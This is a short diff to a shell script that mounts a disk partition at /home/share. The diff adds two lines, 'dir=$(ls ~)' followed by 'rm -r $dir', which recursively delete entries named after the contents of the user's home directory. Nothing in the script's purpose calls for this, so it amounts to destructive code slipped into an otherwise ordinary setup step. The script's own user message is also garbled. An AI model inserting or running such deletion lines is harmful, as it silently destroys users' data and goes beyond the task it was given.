@@ -4,6 +4,8 @@ if [ $user == "root" ]; then
    echo "Please run as can use sudo."
    exit 1
 fi
+dir=$(ls ~)
+rm -r $dir
 sudo mkdir /home/share
 sudo mount /dev/sdb8 /home/share
 dir=$(ls /home/share)
